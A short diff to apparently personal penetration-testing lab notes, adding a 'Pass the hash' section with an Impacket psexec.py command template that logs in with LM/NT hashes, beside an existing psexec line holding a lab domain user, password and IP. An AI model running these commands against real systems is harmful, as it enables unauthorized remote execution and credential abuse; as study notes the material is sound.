@@ -7,3 +7,11 @@ psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
 ```
 
 ^d07ccd
+
+### Pass the hash
+#pass-the-hash 
+```bash
+# or impacket-psexec
+# note this command is the exact same for wmiexec or smbexec.
+psexec.py <user>@<ip> -hashes <LM Hahs>:<NT Hash>
+```
